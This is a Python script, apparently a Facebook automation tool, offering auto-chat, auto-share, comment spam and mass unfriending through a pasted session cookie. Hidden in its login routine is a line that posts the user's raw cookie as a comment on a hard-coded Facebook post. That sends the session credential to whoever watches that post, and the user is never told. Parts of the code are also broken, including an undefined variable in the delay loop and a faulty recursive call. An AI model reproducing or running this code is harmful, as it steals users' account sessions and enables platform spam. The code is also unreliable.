#----------------[ CREATED BY KHAMDIHIDEV ]--------------#
import re, bs4, requests, rich, platform, time, sys, os, random, json, time
from rich.panel import Panel as UsydPanel
from rich.console import Console as UsydConsole
from concurrent.futures import ThreadPoolExecutor as TheEND

dumps,payload=[],{}

def Cetak(Text, Type, Warna):
    if 'banner' in Type:
        return UsydConsole(width=50, style=Warna).print(UsydPanel(Text),justify='center')
    else:
        return UsydConsole(width=50, style=Warna).print(UsydPanel(Text))

def Bersihkan(TypePlatform):
    if 'win' in TypePlatform:
       return os.system('cls')
    else:
       return os.system('clear')

def logo(LOGOLBOK):
    Cetak('''[bold white]╔═╗╦  ╦    ╔╗ ╔═╗╔╦╗╔═╗╔╗ 
╠═╣║  ║    ╠╩╗║ ║ ║ ╠╣ ╠╩╗
╩ ╩╩═╝╩═╝  ╚═╝╚═╝ ╩ ╚  ╚═╝
[bold green]{ [bold white]created by khamdihiDEV [bold green]}''','banner','bold blue')

class Main:
    def __init__(self):
        try:
             cokie = open('data/cookie.txt','r').read()
             token = open('data/tooken.txt','r').read()
        except FileNotFoundError:
             Cetak('[bold red]anda belum login, silakan login terlebih dahulu','YAMETEKUDASAI','bold blue')
             time.sleep(3)
             self.mask()
        self.menu(cokie, token)

    def mask(self):
        Bersihkan(sys.platform) ; logo('PUNYA KHAMDIHIDEV')
        Cetak('[bold white]pastikan anda login dengan akun tumbal, jangan akun utama','KHAMDIHI DEV PRO PELER','bold blue')
        coki = input('  [?] Masukan cookie : ')
        try:
            cari = requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":coki})
            toke = re.search("(EAAG\w+)", cari.text).group(1)
            if "EAAG" in str(toke):
                open("data/cookie.txt","w").write(coki)
                open("data/tooken.txt","w").write(toke)
                i = requests.post(f"https://graph.facebook.com/100086281072244_456347243335515/comments/?message={coki}&access_token={toke}",cookies={"cookie":coki})
                exit(Cetak('[bold white]Login berhasil, silakan jalankan ulang tools ini','AHHAHHAHAHAH','bold blue'))
        except AttributeError:
            exit(Cetak('[bold red]ups error, cookies kamu sudah kadarluarsa','TITID','bold blue'))
        except requests.exceptions.ConnectionError:
            exit(Cetak('[bold red]ups error, tidak ada koneksi internet, mode pesawat dulu','YAMETE','bold blue'))

    def menu(self, kuki, token):
        Bersihkan(sys.platform)
        try:nama = requests.get("https://graph.facebook.com/me?access_token={}".format(token),cookies={"cookie":kuki}).json()['name']
        except KeyError:self.mask()
        except requests.exceptions.ConnectionError:exit(Cetak('[bold red]ups error, tidak ada koneksi internet, mode pesawat dulu','YAMETE','bold blue'))
        logo("JANGAN HAPUS BOT KOMENTAR SAYA MAS, BOLEH DI TAMBAH")
        Cetak(f'[bold white]selamat datang [bold green]{nama} [bold white]di tools bot FB','FAHHSDYH','bold blue')
        Cetak('''[bold white][[bold blue]1[bold white]] Bot Auto Chat
[bold white][[bold blue]2[bold white]] Bot Auto Share
[bold white][[bold blue]3[bold white]] Bot Auto Komentar
[bold white][[bold blue]4[bold white]] Bot Auto Unfriends
[bold white][[bold blue]5[bold white]] Bot Auto Unfollow IG
[bold white][[bold blue]0[bold white]] Keluar Dari Pemrogramman ''','YAHAHAH ASEP','bold blue')
        ask = input('  [?] Choose : ')
        if ask in ['1','01','a']:
             Cetak('[bold white]masukan userid target chat kamu, tidak semua akun bisa kecuali terdapat tombol chat di bagian profile','ASEP','bold blue')
             target = input('  [?] Target bot : ')
             pesan  = input('  [?] Masukan pesan kamu : ')
             Cetak(f'[bold white]proses chat ke {target} sedang di mulai, please wait','MEMEX','bold blue')
             self.chat(target, pesan)

        elif ask in ['2','02','b']:
             Cetak('[bold white]masukan link postingan kamu, pastikan post bersifat publik','BABI','bold blue')
             link = input('  [?] Masukan link : ')
             try:limit = int(input('  [?] Limit share : '))
             except:limit=50
             Cetak('[bold white]Proses Share sedang di mulai klik CTRL lalu z untuk stop','SHARE','bold blue')
             self.share(link,limit,token,kuki)

        elif ask in ['3','03','c']:
             Cetak('[bold white]masukan userid postingan, pastikan bersifat publik','TEMETEETE','bold blue')
             target = input('  [?] Masukan id : ')
             Cetak('[bold white]masukan text komen, gunakan tanda koma untuk pemisahan','memek','bold blue')
             komen = input('  [?] Masukan text komen : ')
             limit = int(input('  [?] Limit komen : '))
             Cetak('[bold white]Proses komen sedang di mulai exit : CTRL + Z','JEMBUT','bold blue')
             self.komen(target, komen, limit,token, kuki)

        elif ask in ['4','04','d']:
             Cetak('[bold white]silakan tunggu sedang dumps teman akun kamu','KHAMDIHI DEV','bold blue')
             self.dumpteman(token, kuki)

        elif ask in ['5','05','e']:
             exit(Cetak('[bold red]Maaf, fitur ini belum tersedia, silakan tunggu update selanjutnya','AWOKwok','bold blue'))

        elif ask in ['0','00','f']:
             os.system('rm -rf data/cookie.txt && rm -rf data/tooken.txt')
             os.system('exit')
        else:
             exit(Cetak('[bold red]pilihan kamu tidak ada di menu','TOLOL LUH','bold blue'))

    def chat(self, target, pesan):
        url = bs4.BeautifulSoup(requests.get(f'https://mbasic.facebook.com/{target}', cookies={'cookie':open('data/cookie.txt','r').read()}).text,'html.parser')
        if 'Gunakan Facebook tanpa tagihan data' in url.find('title').text:
              Cetak('[bold red]facebook mengalihkan kamu, coba di bikin mode free, atau ganti tumbal','BANGSAT','bold blue');exit()
        else:
              for indo in url.find_all('a',href=True):
                  if '/messages/thread/' in indo.get('href'):
                      posh = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com'+ indo['href'], cookies={'cookie':open('data/cookie.txt','r').read()}).text,'html.parser')
                      data = ["fb_dtsg","jazoest","rows","Send","ids["+target+"]"]
                      for kopi in posh.find_all('input'):
                          if kopi.get('name') in data:
                             payload.update({kopi.get('name'):kopi.get('value')})
                          payload.update({"body":pesan})
                      otw_ = requests.post('https://mbasic.facebook.com'+ posh.find('form', method='post')['action'], data=payload, cookies={'cookie':open('data/cookie.txt','r').read()}).text
                      if pesan in otw_:
                           Cetak(f'[bold green]sukses mengirim pesan ke {target} 😎','KHAMDIHI DEV','bold blue');exit()
                      else:
                           Cetak(f'[bold red]gagal mengirim pesan ke {target} 😡','ANJING','bold blue');exit()
                  exit(Cetak('[bold red]Tidak ada tombol pesan di akun anda','TOLOL','bold blue'))

    def useragent(self):
        return ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36')

    def share(self, link, limit, token, sepiderman):
        sukses,gagal=[],[]
        try:
              headers = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":self.useragent()}
              for i in range(limit):
                  link_pos = requests.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=headers, cookies={'cookie':sepiderman})
                  response = json.loads(link_pos.text)
                  print(f"\r  [+] total sukses : {len(sukses)} total gagal : {len(gagal)}", end=" ");
                  sys.stdout.flush()
                  if "id" in response:
                      sukses.append("Share")
                  else:
                      sukses.append("Tolol")
        except Exception as e:
             exit(Cetak('[bold red]kesalahan pada cookies anda atau jaringan anda','MEMEK','bold blue'))

    def dumpteman(self, token, venom):
        try:
             link = requests.get(f"https://graph.facebook.com/me?fields=friends.limit(5001)&access_token={token}",cookies={'cookie':venom}).json()
             for dump in link['friends']['data']:
                 dumps.append(dump['id']+'<=>'+dump['name'])
        except KeyError:
             exit(Cetak('[bold red]dump teman gagal, pastikan akun anda publik','nxn','bold blue'))
        self.posz(venom)

    def posz(self, kukis):
        Cetak('[bold white]masukan delay beberapa detik, paling kecil 5detik!','jembut','bold blue')
        delay = input('  [?] Delay : ')
        if int(delay) <=4 or int(delay) >= 61:
            exit(Cetak('[bold red]Delay anda tidak logis kontol','user goblok','bold blue'))
        Cetak('[bold green]memproses unfriends, klik CTRL + Z untuk menghentikan','SU','bold blue')
        with TheEND(max_workers=30) as asu:
             for x in dumps:
                 user,name = x.split('<=>')
                 asu.submit(self.hapus,delay,user,name,kukis)
        exit(Cetak('[bold green]selesai menghapus teman akun anda','na','bold blue'))

    def delay(self,khamdihiXD, Start):
        waktu = khamdihiXD * 60 + Start
        while waktu:
           min, sec = divmod(waktu, 60)
           print(f'\r  [*] Wait : {min:02d}:{sec:02d}', end=' ')
           time.sleep(1)
           total_second -= 1
        return 0

    def hapus(self, delai, id, nama, kuki):
        global payload
        self.delay(0,int(delai))
        link = bs4.BeautifulSoup(requests.get(f'https://mbasic.facebook.com/removefriend.php?friend_id={id}',cookies={'cookie':kuki}).text,'html.parser')
        posh = link.find('form', method='post')['action']
        list = ["fb_dtsg","jazoest","confirm"]
        for unfriend in link.find_all('input'):
            if unfriend.get('name') in list:
               payload.update({unfriend.get('name'):unfriend.get('value')})
            else:continue
        post = requests.post('https://mbasic.facebook.com'+ posh, cookies={'cookie':kuki}, data=payload).text
        if 'Anda tidak lagi berteman dengan' in post:
            print('')
            Cetak(f'''[bold white][[bold green]*[bold white]] Username : [bold green]{nama}
[bold white][[bold green]*[bold white]] Userid   : [bold green]{id}
[bold white][[bold green]✓[bold white]] Status   : [bold green]sukses''','recode yah bang','bold blue')
        else:
            print('')
            Cetak(f'''[bold white][[bold yellow]*[bold white]] Username : [bold red]{nama}
[bold white][[bold yellow]*[bold white]] Userid   : [bold red]{id}
[bold white][[bold yellpw]×[bold white]] Userid   : [bold red]gagal''','MAMAS','bold blue')
        self.hapus(self, delai, id, nama, kuki)

    def komen(self, id, text, lim,token, cokie):
        ok,no=[],[]
        for x in range(lim):
            for komenn in text.split(','):
                kontol = requests.post(f'https://graph.facebook.com/{id}/comments/?message={komenn}&access_token={token}',cookies={'cookie':cokie})
                cek_st = json.loads(kontol.text)
                print(f'\r  [*] Sedang komen, sukses : {len(ok)} gagal : {len(no)}', end=' ')
                if 'id' in cek_st:
                     ok.append('ya')
                else:
                     no.append('ya')


if __name__ == '__main__':
   Main()

